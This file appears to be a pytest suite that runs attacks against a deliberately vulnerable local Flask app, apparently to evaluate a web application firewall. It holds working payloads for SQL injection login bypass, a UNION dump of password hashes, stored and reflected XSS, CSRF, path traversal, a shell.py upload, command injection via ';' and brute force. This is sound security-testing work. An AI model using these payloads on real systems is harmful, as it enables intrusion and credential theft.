"""
Manual attack smoke tests for the intentionally vulnerable app.

Run with the vulnerable Flask app already listening on 127.0.0.1:5000:
    pytest tests/test_all.py -v

For WAF effectiveness, use the evaluation runner against http://127.0.0.1:8080.
"""
import os
import re
import time

import pytest
import requests

VULN_BASE = "http://127.0.0.1:5000"


def _is_up(base: str) -> bool:
    try:
        requests.get(f"{base}/login", timeout=2)
        return True
    except Exception:
        return False


def _skip_if_down(base: str):
    if not _is_up(base):
        pytest.skip(f"App at {base} is not running")


def _login(base: str, username: str, password: str) -> requests.Session:
    session = requests.Session()
    session.post(
        f"{base}/login",
        data={"username": username, "password": password},
        allow_redirects=True,
    )
    return session


def _reset_passwords():
    import hashlib
    import sqlite3

    db_path = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "app.db"))
    if not os.path.exists(db_path):
        return

    def h(pw):
        return hashlib.md5(pw.encode()).hexdigest()

    db = sqlite3.connect(db_path)
    db.execute("UPDATE users SET password=? WHERE username=?", (h("alice123"), "alice"))
    db.execute("UPDATE users SET password=? WHERE username=?", (h("bob123"), "bob"))
    db.execute("UPDATE users SET password=? WHERE username=?", (h("admin123"), "admin"))
    db.commit()
    db.close()


def attack_sql_login_bypass(base: str) -> bool:
    session = requests.Session()
    response = session.post(
        f"{base}/login",
        data={"username": "admin' OR '1'='1' --", "password": "x"},
        allow_redirects=True,
    )
    return response.status_code == 200 and (
        "messages" in response.url or "/messages" in response.text
    )


def attack_sql_union(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    payload = "' UNION SELECT id,username,password,role,email,avatar FROM users --"
    response = session.get(f"{base}/search", params={"q": payload})
    return bool(re.search(r"\b[0-9a-f]{32}\b", response.text))


def attack_stored_xss(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    marker = f"xss-stored-{int(time.time())}"
    payload = f'<script>alert("{marker}")</script>'
    session.post(f"{base}/messages", data={"content": payload}, allow_redirects=True)
    response = session.get(f"{base}/messages")
    return payload in response.text


def attack_reflected_xss(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    payload = '<script>alert("rxss")</script>'
    response = session.get(f"{base}/search", params={"q": payload})
    return payload in response.text


def attack_csrf(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    response = session.post(
        f"{base}/profile/password",
        data={"new_password": "hacked"},
        allow_redirects=True,
    )
    return response.status_code not in (400, 403)


def attack_path_traversal(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    response = session.get(f"{base}/download", params={"filename": "../init_db.py"})
    return response.status_code == 200 and b"sqlite3" in response.content


def attack_privilege_escalation(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    response = session.get(f"{base}/admin/users")
    return response.status_code == 200 and "admin" in response.text


def attack_unsafe_upload(base: str) -> bool:
    session = _login(base, "alice", "alice123")
    files = {"avatar": ("shell.py", b"print('pwned')", "text/plain")}
    response = session.post(
        f"{base}/profile/avatar",
        files=files,
        allow_redirects=True,
    )
    return response.status_code not in (400, 403) and "shell.py" in response.text


def attack_cmd_injection(base: str) -> bool:
    session = _login(base, "admin", "admin123")
    marker = os.path.normpath(
        os.path.join(os.path.dirname(__file__), "..", "cmd_injection_marker.txt")
    )
    payload = f"nonexistent; echo pwned > {marker}"
    session.post(
        f"{base}/admin/messages/delete",
        data={"filename": payload},
        allow_redirects=True,
    )
    time.sleep(0.3)
    exists = os.path.exists(marker)
    if exists:
        os.remove(marker)
    return exists


def attack_brute_force(base: str) -> bool:
    session = requests.Session()
    for _ in range(12):
        response = session.post(
            f"{base}/login",
            data={"username": "alice", "password": "wrongpassword"},
            allow_redirects=False,
        )
        if response.status_code == 429:
            return False
    return True


ATTACKS = [
    ("SQL login bypass", attack_sql_login_bypass),
    ("SQL UNION dump", attack_sql_union),
    ("stored XSS", attack_stored_xss),
    ("reflected XSS", attack_reflected_xss),
    ("CSRF password change", attack_csrf),
    ("path traversal", attack_path_traversal),
    ("privilege escalation", attack_privilege_escalation),
    ("unsafe file upload", attack_unsafe_upload),
    ("command injection", attack_cmd_injection),
    ("brute force", attack_brute_force),
]


@pytest.mark.parametrize("name,attack", ATTACKS)
def test_vulnerable_app_attack_succeeds(name, attack):
    _skip_if_down(VULN_BASE)
    try:
        assert attack(VULN_BASE), f"{name} should succeed against vulnerable app"
    finally:
        if attack is attack_csrf:
            _reset_passwords()


if __name__ == "__main__":
    if not _is_up(VULN_BASE):
        raise SystemExit("Start the vulnerable app first: python app/vulnerable/app.py")

    print("Running manual attack smoke tests against vulnerable app")
    for name, attack in ATTACKS:
        try:
            result = attack(VULN_BASE)
        finally:
            if attack is attack_csrf:
                _reset_passwords()
        print(f"{name:24s}: {'succeeded' if result else 'failed'}")
